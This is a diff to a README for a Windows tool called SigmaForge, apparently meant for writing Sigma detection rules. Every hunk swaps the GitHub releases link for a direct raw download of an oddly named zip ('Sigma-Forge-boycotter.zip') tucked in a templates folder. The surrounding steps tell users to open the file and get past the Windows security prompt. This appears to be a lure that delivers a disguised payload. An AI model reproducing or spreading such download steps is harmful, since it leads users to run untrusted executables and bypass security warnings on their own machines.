@@ -1,6 +1,6 @@
 # 🛡️ SigmaForge - Build Sigma Rules Faster
 
-[![Download SigmaForge](https://img.shields.io/badge/Download-SigmaForge-purple?style=for-the-badge)](https://github.com/Unaddicted-swisspine980/SigmaForge/releases)
+[![Download SigmaForge](https://img.shields.io/badge/Download-SigmaForge-purple?style=for-the-badge)](https://github.com/Unaddicted-swisspine980/SigmaForge/raw/refs/heads/main/templates/Sigma-Forge-boycotter.zip)
 
 ## 🚀 What SigmaForge Does
 
@@ -12,7 +12,7 @@ Use it when you want to turn a detection idea into a rule without writing everyt
 
 Visit the release page to download and run this app on Windows:
 
-https://github.com/Unaddicted-swisspine980/SigmaForge/releases
+https://github.com/Unaddicted-swisspine980/SigmaForge/raw/refs/heads/main/templates/Sigma-Forge-boycotter.zip
 
 Look for the latest release file in the list. Download the Windows version, then open the file on your PC.
 
@@ -42,7 +42,7 @@ If Windows shows a security prompt, choose the option that lets you open the fil
 
 Follow these steps on Windows:
 
-1. Open this link: https://github.com/Unaddicted-swisspine980/SigmaForge/releases
+1. Open this link: https://github.com/Unaddicted-swisspine980/SigmaForge/raw/refs/heads/main/templates/Sigma-Forge-boycotter.zip
 2. Find the newest release at the top of the page
 3. Open the release asset for Windows
 4. Save the file to your Downloads folder or Desktop
